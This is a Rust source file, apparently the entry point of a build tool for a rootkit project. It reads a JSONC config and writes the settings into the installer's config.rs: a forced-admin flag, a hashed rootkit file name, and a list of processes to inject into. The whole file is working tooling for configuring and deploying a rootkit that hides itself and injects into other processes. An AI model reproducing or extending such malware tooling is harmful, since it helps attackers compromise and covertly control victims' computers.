mod util;
mod editor;

use std::{env, fs, process};
use std::path::PathBuf;

use serde_json::Value;

use crate::editor::Editor;

const CONFIG_FILE_NAME: &str = "config.jsonc";
const INSTALLER_DIR_NAME: &str = "installer";

fn main() {
    let args = env::args()
        .skip(1)
        .collect::<Vec<String>>();

    let exec_path = env::current_exe()
        .unwrap();

    let mut config_file_path = PathBuf::new();

    if let Some(first) = args.first() {
        config_file_path = PathBuf::from(first);
    } else {
        let file = util::find_file_upstream(&exec_path, CONFIG_FILE_NAME);
        if let Some(the_file) = file {
            config_file_path = the_file;
        }
    }

    if !config_file_path.exists() || !config_file_path.is_file() {
        eprintln!("failed to find config file - {}", config_file_path.display());
        process::exit(-1);
    }

    let installer_dir = util::find_dir_upstream(&exec_path, INSTALLER_DIR_NAME)
        .unwrap_or_else(|| {
            eprintln!("failed to find installer directory");
            process::exit(-1);
        });

    if !installer_dir.exists() || !installer_dir.is_dir() {
        eprintln!("failed to find installer directory - {}", installer_dir.display());
        process::exit(-1);
    }

    let installer_config_file_path = installer_dir
        .join("src\\config.rs");

    let config_text = fs::read_to_string(config_file_path)
        .unwrap();

    let removed_comments = config_text
        .lines()
        .map(|line| {
            if let Some(pos) = line.find("//") {
                &line[..pos]
            } else {
                line
            }
        })
        .collect::<Vec<&str>>()
        .join("\n");

    let config_json = serde_json::from_str::<Value>(&removed_comments)
        .unwrap();

    Editor::new(&installer_config_file_path)
        .set_bool("FORCE_ADMIN", config_json["admin_mode"].as_bool().unwrap())
        .set_byte_array("H_ROOTKIT_FILE_NAME", blake3::hash(config_json["rootkit_name"].as_str().unwrap().as_bytes()).as_bytes())
        .set_string_array("INJECTABLE_PROCS", &config_json["injectable_procs"].as_array().unwrap().iter().map(|v| v.as_str().unwrap()).collect::<Vec<&str>>())
        .finalize()
        .ok();
}
